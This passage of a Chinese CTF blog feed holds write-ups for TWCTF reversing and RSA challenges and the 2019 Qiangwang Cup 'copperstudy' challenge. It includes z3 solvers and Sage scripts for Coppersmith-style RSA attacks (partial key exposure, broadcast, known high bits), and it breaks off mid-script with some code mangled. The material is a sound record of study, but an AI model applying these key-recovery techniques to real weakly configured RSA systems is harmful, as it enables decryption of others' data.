class="post-anchor" href="#check4"></a></h3><pre><code class="hljs cpp"><span class="hljs-built_in">memset</span>(v45, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v45));<span class="hljs-keyword">for</span> ( ii = <span class="hljs-number">0</span>; ii &lt;= <span class="hljs-number">31</span>; ++ii )&#123;  v7 = s[ii + <span class="hljs-number">6</span>];  <span class="hljs-keyword">if</span> ( v7 &lt;= <span class="hljs-number">0x2F</span> || v7 &gt; <span class="hljs-number">0x39</span> )  &#123;    <span class="hljs-keyword">if</span> ( v7 &lt;= <span class="hljs-number">0x60</span> || v7 &gt; <span class="hljs-number">0x66</span> )      v45[ii] = <span class="hljs-number">0</span>;    <span class="hljs-keyword">else</span>      v45[ii] = <span class="hljs-number">0x80</span>;  &#125;  <span class="hljs-keyword">else</span>  &#123;    v45[ii] = <span class="hljs-number">0xFF</span>;  &#125;&#125;<span class="hljs-keyword">if</span> ( <span class="hljs-built_in">memcmp</span>(v45, &amp;unk_400FC0, <span class="hljs-number">0x80</span>uLL) )&#123;  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"incorrect"</span>);  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);&#125;</code></pre><h3 id="check5">check5<a class="post-anchor" href="#check5"></a></h3><pre><code class="hljs cpp">v18 = <span class="hljs-number">0</span>;    <span class="hljs-keyword">for</span> ( jj = <span class="hljs-number">0</span>; jj &lt;= <span class="hljs-number">15</span>; ++jj )      v18 += s[<span class="hljs-number">2</span> * (jj + <span class="hljs-number">3</span>)];    <span class="hljs-keyword">if</span> ( v18 != <span class="hljs-number">1160</span> )    &#123;      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"incorrect"</span>);      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);    &#125;</code></pre><h3 id="check6">check6<a class="post-anchor" href="#check6"></a></h3><pre><code class="hljs cpp">  <span class="hljs-keyword">if</span> ( s[<span class="hljs-number">37</span>] != <span class="hljs-number">0x35</span> || s[<span class="hljs-number">7</span>] != <span class="hljs-number">102</span> || s[<span class="hljs-number">11</span>] != <span class="hljs-number">0x38</span> || s[<span class="hljs-number">12</span>] != <span class="hljs-number">0x37</span> || s[<span class="hljs-number">23</span>] != <span class="hljs-number">0x32</span> || s[<span class="hljs-number">31</span>] != <span class="hljs-number">0x34</span> )  &#123;    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"incorrect"</span>);    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);  &#125;  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Correct: %s\n"</span>, s, a2);  result = <span class="hljs-number">0L</span>L;&#125;</code></pre><p>解题脚本如下：</p><pre><code class="hljs python"><span class="hljs-comment"># !user/bin/python2.7</span><span class="hljs-comment"># coding:utf-8</span><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> Counter<span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *s = Solver()flag = [BitVec(<span class="hljs-string">"a%d"</span>%i,<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">32</span>)]sum1 = [<span class="hljs-number">0x15E</span>, <span class="hljs-number">0x0DA</span>, <span class="hljs-number">0x12F</span>, <span class="hljs-number">0x131</span>, <span class="hljs-number">0x100</span>, <span class="hljs-number">0x131</span>, <span class="hljs-number">0x0FB</span>, <span class="hljs-number">0x102</span>]xor1 = [<span class="hljs-number">0x52</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x58</span>]sum2 = [<span class="hljs-number">0x129</span>, <span class="hljs-number">0x103</span>, <span class="hljs-number">0x12B</span>, <span class="hljs-number">0x131</span>, <span class="hljs-number">0x135</span>, <span class="hljs-number">0x10B</span>, <span class="hljs-number">0x0FF</span>, <span class="hljs-number">0x0FF</span>]xor2 = [<span class="hljs-number">1</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x51</span>]cnt = [<span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]memcmp = [<span class="hljs-number">0x80</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>]d = <span class="hljs-string">"0123456789abcdef"</span><span class="hljs-string">'''for i in range(0,16):s.add(str(flag).count(str(ord(d[i])))==cnt[i])'''</span><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">32</span>):<span class="hljs-keyword">if</span> memcmp[j] == <span class="hljs-number">0x80</span>:s.add(flag[j]&gt; <span class="hljs-number">0x60</span>)s.add(flag[j]&lt;=<span class="hljs-number">0x66</span>)<span class="hljs-keyword">else</span>:s.add(flag[j]&lt;=<span class="hljs-number">0x39</span>)s.add(flag[j]&gt; <span class="hljs-number">0x2f</span>)<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> flag:s.add(<span class="hljs-number">0x30</span>&lt;=x)s.add(<span class="hljs-number">0x67</span>&gt;x)s.add(flag[<span class="hljs-number">1</span>]==<span class="hljs-number">102</span>)s.add(flag[<span class="hljs-number">5</span>]==<span class="hljs-number">0x38</span>)s.add(flag[<span class="hljs-number">6</span>]==<span class="hljs-number">0x37</span>)s.add(flag[<span class="hljs-number">17</span>]==<span class="hljs-number">0x32</span>)s.add(flag[<span class="hljs-number">25</span>]==<span class="hljs-number">0x34</span>)s.add(flag[<span class="hljs-number">31</span>]==<span class="hljs-number">0x35</span>)<span class="hljs-comment">#for i in range(len())</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(flag)):s.add(flag[i]!=<span class="hljs-number">51</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,len(flag),<span class="hljs-number">4</span>):s.add(flag[i]+flag[i+<span class="hljs-number">1</span>]+flag[i+<span class="hljs-number">2</span>]+flag[i+<span class="hljs-number">3</span>]==sum1[i/<span class="hljs-number">4</span>])s.add(flag[i]^flag[i+<span class="hljs-number">1</span>]^flag[i+<span class="hljs-number">2</span>]^flag[i+<span class="hljs-number">3</span>]==xor1[i/<span class="hljs-number">4</span>])<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>):s.add(flag[i]+flag[i+<span class="hljs-number">8</span>]+flag[i+<span class="hljs-number">16</span>]+flag[i+<span class="hljs-number">24</span>]==sum2[i])s.add(flag[i]^flag[i+<span class="hljs-number">8</span>]^flag[i+<span class="hljs-number">16</span>]^flag[i+<span class="hljs-number">24</span>]==xor2[i])sum = <span class="hljs-number">0</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">32</span>,<span class="hljs-number">2</span>):sum += flag[i]s.add(sum == <span class="hljs-number">1160</span>)<span class="hljs-keyword">print</span> <span class="hljs-string">"[-] check sat ·····"</span><span class="hljs-keyword">if</span> s.check() == sat:m = s.model()<span class="hljs-keyword">print</span> m<span class="hljs-keyword">print</span> <span class="hljs-string">"[+] print flag ·····"</span>kk = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">32</span>):kk +=  chr(int(<span class="hljs-string">"%s"</span> % (m[flag[i]])))<span class="hljs-keyword">print</span> <span class="hljs-string">"TWCTF&#123;"</span>+kk+<span class="hljs-string">"&#125;"</span><span class="hljs-keyword">else</span>:<span class="hljs-keyword">print</span> <span class="hljs-string">"[+] False     ·····"</span></code></pre><h2 id="real-baby-rsa">real baby rsa<a class="post-anchor" href="#real-baby-rsa"></a></h2><p>加密是逐个字符加密<br>我们可以加密所有可见字符<br>然后对比出flag</p><pre><code class="hljs python">flag = <span class="hljs-string">'TWCTF&#123;CENSORED&#125;'</span><span class="hljs-keyword">import</span> libnum<span class="hljs-comment"># Public Parameters</span>N = <span class="hljs-number">36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091</span>e = <span class="hljs-number">65537</span><span class="hljs-string">'''# Encrypt the flag!for char in flag:    print(pow(ord(char), e, N))'''</span>dic = <span class="hljs-string">"TWCTF&#125;&#123;QWERTYUIOPASDFGHJKLZXCVBNM?/&gt;&lt;.,:;\"\'[]qwertyuiopasdfghjklzxcvbnm0123456789!@#$%^&amp;*()_-+=~`"</span>flag = <span class="hljs-string">""</span><span class="hljs-keyword">with</span> open(<span class="hljs-string">'output'</span>) <span class="hljs-keyword">as</span> f:<span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:xx = line.rstrip()<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic:zz = str(pow(ord(i),e,N))<span class="hljs-keyword">if</span> xx[:<span class="hljs-number">600</span>] == zz[:<span class="hljs-number">600</span>]:flag += i<span class="hljs-keyword">break</span><span class="hljs-keyword">print</span> flag</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019强网杯-copperstudy</title>
      <link href="/2019/07/17/2019%E5%BC%BA%E7%BD%91%E6%9D%AF-copperstudy/"/>
      <url>/2019/07/17/2019%E5%BC%BA%E7%BD%91%E6%9D%AF-copperstudy/</url>
      
        <content type="html"><![CDATA[<h2 id="copperstudy-–-coppersmith">copperstudy – coppersmith<a class="post-anchor" href="#copperstudy-–-coppersmith"></a></h2><p>解题脚本</p><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> time<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cha1</span><span class="hljs-params">(s,s256)</span>:</span>ss = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>):ss = ss + chr(int((s[<span class="hljs-number">2</span> * i] + s[<span class="hljs-number">2</span> * i + <span class="hljs-number">1</span>]),<span class="hljs-number">16</span>))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):<span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):a = ss + chr(i) + chr(j) + chr(h)<span class="hljs-keyword">if</span> hashlib.sha256(a).hexdigest() == s256:<span class="hljs-keyword">return</span> a.encode(<span class="hljs-string">'hex'</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:ip = <span class="hljs-string">'119.3.245.36'</span>port = <span class="hljs-number">12345</span>teamtoken = <span class="hljs-string">'dde3f26577d8d7816378038885943de1'</span>s = remote(ip,port)s.recvuntil(<span class="hljs-string">'[+]hashlib.sha256(skr).hexdigest()='</span>)d256 = s.recvline()s.recvuntil(<span class="hljs-string">"[+]skr[0:5].encode('hex')="</span>)d = s.recvline()data = cha1(d.strip(),d256.strip())s.recvuntil(<span class="hljs-string">"[-]skr.encode('hex')="</span>)s.sendline(data)s.recvuntil(<span class="hljs-string">"[+]teamtoken:"</span>)s.sendline(teamtoken)time.sleep(<span class="hljs-number">2</span>）    <span class="hljs-comment">#challenge1 -- Known High Bits Message Attack</span>m = <span class="hljs-string">'858be94f2f6253ac4586da573086221c8256bf7fe7c7f6d0d4e459fd28abf8883cfa225f5cbb519d2c8e0427aab1dc03979886ac104018ddec85e8edb7bbc590'</span>s.recvuntil(<span class="hljs-string">"_bytes(m).encode('hex')="</span>)s.sendline(m)time.sleep(<span class="hljs-number">2</span>)    <span class="hljs-comment">#challenge2 -- Factoring with High Bits Known</span>m2 = <span class="hljs-string">"7e2a3378b47f389134bda8811e253ace33c6978fbb5d0022ab312cf1f5246648516b320bf749e71a1d8cbdcab64fdb5ce8159022ea96484949152d31a9f17665"</span>s.recvuntil(<span class="hljs-string">"_bytes(m).encode('hex')="</span>)s.sendline(m2)time.sleep(<span class="hljs-number">2</span>)<span class="hljs-comment">#challenge3 -- Patial Key Exposure Attack</span>m3 = <span class="hljs-string">"86ee347cbeec999564c0615d33ea5e3cfb5e66f5d00b172194c0f86915de3ff19d2dffc2217caaa608ea6556b18e8f420fc1b287871475a0cd5c8f2d97e4c12c"</span>s.recvuntil(<span class="hljs-string">"_bytes(m).encode('hex')="</span>)s.sendline(m3)time.sleep(<span class="hljs-number">4</span>)<span class="hljs-comment">#challenge4 -- Basic Broadcast Attack</span>m4 = <span class="hljs-string">"380185242a03c9d6ca7a2e117490ebaf03a493b1250f4e248c732c2714eb6b9fd2fa4c90a4f1d8120ffbafb3b7fda85fff46a67a1da3e316392ec267e1fa7c27"</span>s.recvuntil(<span class="hljs-string">"_bytes(m).encode('hex')="</span>)s.sendline(m4)         time.sleep(<span class="hljs-number">20</span>)<span class="hljs-comment">#challenge5 -- Related Message Attack</span>    m5 = <span class="hljs-string">"0811b179ddbc246fc00ad94b6251c818e331941732fdfce9979c015ca7f0ec873641338c5814f3e8e50dfab04bd6aa0689334b517de10d7bac398aef23f929b3"</span>s.sendlineafter(<span class="hljs-string">"[-]long_to_bytes(m).encode('hex')="</span>,m5)time.sleep(<span class="hljs-number">4</span>)<span class="hljs-comment">#challenge6 -- Boneh and Durfee attack</span>m6 = <span class="hljs-string">"6b3bb0cdc72a7f2ce89902e19db0fb2c0514c76874b2ca4113b86e6dc128d44cc859283db4ca8b0b5d9ee35032aec8cc8bb96e8c11547915fc9ef05aa2d72b28"</span>s.sendlineafter(<span class="hljs-string">"[-]long_to_bytes(m).encode('hex')="</span>,m6)time.sleep(<span class="hljs-number">4</span>)<span class="hljs-keyword">print</span> s.recv()</code></pre><h3 id="challenge1-–-Known-High-Bits-Message-Attack">challenge1 – Known High Bits Message Attack<a class="post-anchor" href="#challenge1-–-Known-High-Bits-Message-Attack"></a></h3><pre><code class="hljs undefined">[++++++++++++++++]proof completed[++++++++++++++++][+]Generating challenge 1[+]n=0x331e53d1808798def926bc2c8081b3a959cec19c04ad6dd3a25357b5e3889dc0bbb8618b80ddecca89494eec6015080cf4402fcef0971f76d978c517ab1e3019ae65fdc443a99036d4adcda780dd662ae3eb5d3c6ce68adfe38137689df75a6196a7a6dc94a681dfb5437439c810416112b250402f53eb2341df2145c569c135L[+]e=3[+]m=random.getrandbits(512)[+]c=pow(m,e,n)=0xab7b8544dc18a13c221d33b8ea84ee69ea3c74a1ce123e6f0a565e6afaff3d2682dfa254170a1200d66e9c017727c43b3c1af221f81d90598741454f68448cef4128ff56bb9929ffd3edaaa8069c08293463ad20486b6e6bee654ab471a3b364122d41f4570f6aa1084eb1eda5eebde1436a488e0390f8057df835f323802d4L[+]((m&gt;&gt;72)&lt;&lt;72)=0x858be94f2f6253ac4586da573086221c8256bf7fe7c7f6d0d4e459fd28abf8883cfa225f5cbb519d2c8e0427aab1dc03979886ac104018000000000000000000L[-]long_to_bytes(m).encode(&apos;hex&apos;)=</code></pre><p>题目给了明文的高位部分</p><pre><code class="hljs python">n =e = <span class="hljs-number">3</span>m = randrange(n)c = pow(m, e, n)beta = <span class="hljs-number">1</span>epsilon = beta^<span class="hljs-number">2</span>/<span class="hljs-number">7</span>nbits = n.nbits()kbits = floor(nbits*(beta^<span class="hljs-number">2</span>/e-epsilon))<span class="hljs-comment">#mbar = m &amp; (2^nbits-2^kbits)</span>mbar =c =<span class="hljs-keyword">print</span> “upper %d bits (of %d bits) <span class="hljs-keyword">is</span> given” % (nbits-kbits, nbits)PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = (mbar + x)^e – c<span class="hljs-keyword">print</span> mx0 = f.small_roots(X=<span class="hljs-number">2</span>^kbits, beta=<span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]  <span class="hljs-comment"># find root &lt; 2^kbits with factor = n</span><span class="hljs-keyword">print</span> mbar + x0<span class="hljs-keyword">print</span> x0</code></pre><h3 id="challenge2-–-Factoring-with-High-Bits-Known">challenge2 – Factoring with High Bits Known<a class="post-anchor" href="#challenge2-–-Factoring-with-High-Bits-Known"></a></h3><pre><code class="hljs undefined">[++++++++++++++++]challenge 1 completed[++++++++++++++++][+]Generating challenge 2[+]n=0x116c51f73ef1c6b3b890dd8be446b80ac1dbe93742348e1284a7fdf0c76604ceae72011918f18de6b0ab873500ef2ed351110b67acce5b8c48a750a376c3e0117c44ec58e84e35f2ebf0e553b718720952dc826e364f130c2839c76878e0bfb3be0f24b06b3d91f1655e7ce588d2a3c429901197012db4d8b802308072bfca3fL[+]e=65537[+]m=random.getrandbits(512)[+]c=pow(m,e,n)=0x8d8fba82b1ca4e8a6e87b1ed5d50a9e6e49b3fb2aed78208e8c513842dedb5f14b82b39e03ea86089e76b59ff7bec0f6647096098346dcf64c7d1aaf533f99827fd9979dee217c511a3192e99a70d4fcd6aa44b2cf52a1ceddf99db42cbf2872e7e2ed421a4a9ff548bef6dfdad7ef17b09748bdf0025dfb93091e11115ebd4L[+]((p&gt;&gt;128)&lt;&lt;128)=0x2bff4035e24f2023f876abaf53ef53374d0208d59d4350a1cf356050c3a09cfc644d9c46cb59f013fadd96bea4a56dd100000000000000000000000000000000L[-]long_to_bytes(m).encode(&apos;hex&apos;)=</code></pre><pre><code class="hljs python">n=<span class="hljs-number">0xspan>p=<span class="hljs-number">0xBCF6D95C9FFCA2B17FD930C743BCEA314A5F24AE06C12CE62CDB6E8306A545DE468F1A23136321EB82B4B8695ECE58B763ECF8243CBBFADE0603922C130ED143D4D3E88E483529C820F7B53E4346511EB14D4D56CB2B714D3BDC9A2F2AB655993A31E0EB196E8F63028F9B29521E9B3609218BA0000000000000000000000000</span>p_fake = p+<span class="hljs-number">0x10000000000000000000000000</span>pbits = <span class="hljs-number">1024</span>kbits = pbits<span class="hljs-number">-576</span>pbar = p_fake &amp; (<span class="hljs-number">2</span>^pbits<span class="hljs-number">-2</span>^kbits)<span class="hljs-keyword">print</span> <span class="hljs-string">"upper %d bits (of %d bits) is given"</span> % (pbits-kbits, pbits)PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = x + pbarx0 = f.small_roots(X=<span class="hljs-number">2</span>^kbits, beta=<span class="hljs-number">0.4</span>)[<span class="hljs-number">0</span>]  <span class="hljs-comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span><span class="hljs-keyword">print</span> x0 + pbar</code></pre><h3 id="challenge3-–-Patial-Key-Exposure-Attack">challenge3 – Patial Key Exposure Attack<a class="post-anchor" href="#challenge3-–-Patial-Key-Exposure-Attack"></a></h3><pre><code class="hljs undefined">[++++++++++++++++]challenge 2 completed[++++++++++++++++][+]Generating challenge 3[+]n=0x56705388192a25439c7ec9f826467255aeac3a1991b0a5804e8cbe01d4fd33c0accdacc8cb2497969133116d841032cd023f29e4014b0c7619c40ce6e1977308f3587da928fe7c103e8fd68c0e909d229e68c23879c010f88dca4481af1c7030466edc93898b12f31dba9e7aa513fb1fd84c3d1d028cc068160501dafa1d54bL[+]e=3[+]m=random.getrandbits(512)[+]c=pow(m,e,n)=0xcbe7d8021fa02b92239521aeaaf76b2d9553b6b738c79a2c31ef9dcef7875d5bde76f5ebb318660761090869c02c182a29516482e5daf090df76d10eab9398ede85a00d47abb3e27f6a87f8c0928e18c778efb3b6a02acb52257369cbc7e3015bda888e50d5586a34a5554df1f5f0e4cb0b8e9dd442ed939f610d18731be3L[+]d=invmod(e,(p-1)*(q-1))[+]d&amp;((1&lt;&lt;512)-1)=0xd74e2c4973ea6530620197a999a7a78d85a3029dfe8931397ee15b480c2f77b5042938e2f58f60e9c44e4f8d911b661b42dac0dbc0c1513773f870916b2418abL[-]long_to_bytes(m).encode(&apos;hex&apos;)=</code></pre><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">partial_p</span><span class="hljs-params">(p0, kbits, n)</span>:</span>    PR.&lt;x&gt; = PolynomialRing(Zmod(n))    nbits = n.nbits()    f = <span class="hljs-number">2</span>^kbits*x + p0    f = f.monic()    roots = f.small_roots(X=<span class="hljs-number">2</span>^(nbits//<span class="hljs-number">2</span>-kbits), beta=<span class="hljs-number">0.3</span>)  <span class="hljs-comment"># find root &lt; 2^(nbits//2-kbits) with factor &gt;= n^0.3</span>    <span class="hljs-keyword">if</span> roots:        x0 = roots[<span class="hljs-number">0</span>]        p = gcd(<span class="hljs-number">2</span>^kbits*x0 + p0, n)        <span class="hljs-keyword">return</span> ZZ(p)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find_p</span><span class="hljs-params">(d0, kbits, e, n)</span>:</span>    X = var(<span class="hljs-string">'X'</span>)    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">1</span>, e+<span class="hljs-number">1</span>):        results = solve_mod([e*d0*X - k*X*(n-X+<span class="hljs-number">1</span>) + k*n == X], <span class="hljs-number">2</span>^kbits)        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> results:            p0 = ZZ(x[<span class="hljs-number">0</span>])            p = partial_p(p0, kbits, n)            <span class="hljs-keyword">if</span> p:                <span class="hljs-keyword">return</span> p<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:    n = <span class="hljs-number">0x56705388192a25439c7ec9f826467255aeac3a1991b0a5804e8cbe01d4fd33c0accdacc8cb2497969133116d841032cd023f29e4014b0c7619c40ce6e1977308f3587da928fe7c103e8fd68c0e909d229e68c23879c010f88dca4481af1c7030466edc93898b12f31dba9e7aa513fb1fd84c3d1d028cc068160501dafa1d54b</span>    e = <span class="hljs-number">3</span>    d = <span class="hljs-number">0xd74e2c4973ea6530620197a999a7a78d85a3029dfe8931397ee15b480c2f77b5042938e2f58f60e9c44e4f8d911b661b42dac0dbc0c1513773f870916b2418ab</span>    beta = <span class="hljs-number">0.5</span>    epsilon = beta^<span class="hljs-number">2</span>/<span class="hljs-number">7</span>    nbits = n.nbits()    kbits = floor(nbits*(beta^<span class="hljs-number">2</span>+epsilon))    d0 = d &amp; (<span class="hljs-number">2</span>^kbits<span class="hljs-number">-1</span>)    <span class="hljs-keyword">print</span> <span class="hljs-string">"lower %d bits (of %d bits) is given"</span> % (kbits, nbits)    p = find_p(d0, kbits, e, n)    <span class="hljs-keyword">print</span> <span class="hljs-string">"found p: %d"</span> % p    q = n//p    <span class="hljs-keyword">print</span> d    <span class="hljs-keyword">print</span> inverse_mod(e, (p<span class="hljs-number">-1</span>)*(q<span class="hljs-number">-1</span>))lower <span class="hljs-number">291</span> bits (of <span class="hljs-number">1019</span> bits) <span class="hljs-keyword">is</span> givenfound p: <span class="hljs-number">1556928330519222949185052385205770511398851299027067030656737931164636055914888549373041706626311467428902396847671677538586996128733508490246169051729867</span><span class="hljs-number">11276456863053049846778143161914757923513133539274086554204762345263769886584929828068603961625809916094813748871857226391606896679593696242167359171991723</span><span class="hljs-number">2529140489407550411860842517642709534323596281579020017754223390342047118996108186564106911103882855078009689932113065210547912624644857741988858283570121514938039297592621259739497542591992130948345362969430345095193882648382370898025817668567519357247651572797940766217498405274704879818312077507052181675</span></code></pre><h3 id="challenge4-–-Basic-Broadcast-Attack">challenge4 – Basic Broadcast Attack<a class="post-anchor" href="#challenge4-–-Basic-Broadcast-Attack"></a></h3><pre><code class="hljs undefined">[++++++++++++++++]challenge 3 completed[++++++++++++++++][+]Generating challenge 4[+]e=3[+]m=random.getrandbits(512)[+]n1=0x9c94fecac76f9c5524d994d51efc1f02ad40fcf9cd5409d7c9f86a9f10e31b6c73d8bc02df743fea939acbcf9f81a748914fce0f8df1155c0f29faac38bd70b322eb7bc69c130720bdcb2ad2cbb84ad182b36e93170d81cb3a68969c850519e86b6a3676534cdbe85c9429c058230d58527d8028c134d6078cbb89faa071848fL[+]c1=pow(m,e,n1)=0x5e3b988abb38c33e145bbc16f56ec192253d26cc053d4f78e073d0d035eda4ea91f33ec7f7cd1a56165cae95a86e0a4edabb83743966b3a4621bb33753aec5fa4b1c6d80e0d404c19c6659c8ff6dc4f5539a5dbae659ca4f24f4c53a65c5c42bf9de04852c098841d2affe83c59be99b6ecd857e232cb008c657e1f55137bf06L[+]n2=0x409a8a39fcb302f0660f0a85b6d43636dce5b4797b6f3ef0b4972f70b6e0c74038c55ba50e0c918057e9ceaee024ae81da2faede8b5b66caae6892943a8892ad98b1f6f208b8b5ded753e6b8c6b94c5faf67314384f3f26e3dca579237893f098c90b0f8b80692aed4606947d656b74b69444ba0dc24b9c66a339f7a50f52783L[+]c2=pow(m,e,n2)=0xc5381d89ca5be27f43c30dbc395ce0d5b8a69adb80dc05d7f5d8dffc1b2fb76d2ab656f5659b9280c9cac83addcc0eb58e86f8e07a37f28b0500ab75bde4eb2b2e6631eeeb6bbe146c889b2ac6046864977aaee7292676fdbd4fb987940a83a94c3d04aef256b50d304d945528c69866acf591f914c0e50e012734827143ed7L[+]n3=0x56a700d8f04da68c6cdb08e04a0cb2fa332389e10c1a3c94b220cb39144fc971c804ab02637303866040c13814194d863814453eec48db6136741d3a599cf890c678114b65dc60da2bbd29651bd0148f8949d69c4b18460ad0e1908eba384a1b51041e41caf70fed285fb34a8e56f04487d6d8b5d88f2a88d88565ef6757a697L[+]c3=pow(m,e,n3)=0x73e58f11dd9f637a7a7c05f6223ee95cb6d34a77583bfc6ca675955d51dd15ff4561654264e9985fcb2e87e3ddda7d6d7620cee80a1f2c20944d5d6f456a3e892f74b6745ddecbe3447825bf44344fc9e0839bdaebcca8352075675ffc8fee8c3698a87f3110f4004fea88c3faf05e5a527854e759e315b487b49e8ff9510cbL[-]long_to_bytes(m).encode(&apos;hex&apos;)=</code></pre><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<span class="hljs-keyword">import</span> libnume=<span class="hljs-number">3</span>n_0=<span class="hljs-number">0x9c94fecac76f9c5524d994d51efc1f02ad40fcf9cd5409d7c9f86a9f10e31b6c73d8bc02df743fea939acbcf9f81a748914fce0f8df1155c0f29faac38bd70b322eb7bc69c130720bdcb2ad2cbb84ad182b36e93170d81cb3a68969c850519e86b6a3676534cdbe85c9429c058230d58527d8028c134d6078cbb89faa071848f</span>ct_0=<span class="hljs-number">0x5e3b988abb38c33e145bbc16f56ec192253d26cc053d4f78e073d0d035eda4ea91f33ec7f7cd1a56165cae95a86e0a4edabb83743966b3a4621bb33753aec5fa4b1c6d80e0d404c19c6659c8ff6dc4f5539a5dbae659ca4f24f4c53a65c5c42bf9de04852c098841d2affe83c59be99b6ecd857e232cb008c657e1f55137bf06</span>n_1=<span class="hljs-number">0x409a8a39fcb302f0660f0a85b6d43636dce5b4797b6f3ef0b4972f70b6e0c74038c55ba50e0c918057e9ceaee024ae81da2faede8b5b66caae6892943a8892ad98b1f6f208b8b5ded753e6b8c6b94c5faf67314384f3f26e3dca579237893f098c90b0f8b80692aed4606947d656b74b69444ba0dc24b9c66a339f7a50f52783</span>ct_1=<span class="hljs-number">0xc5381d89ca5be27f43c30dbc395ce0d5b8a69adb80dc05d7f5d8dffc1b2fb76d2ab656f5659b9280c9cac83addcc0eb58e86f8e07a37f28b0500ab75bde4eb2b2e6631eeeb6bbe146c889b2ac6046864977aaee7292676fdbd4fb987940a83a94c3d04aef256b50d304d945528c69866acf591f914c0e50e012734827143ed7</span>n_2=<span 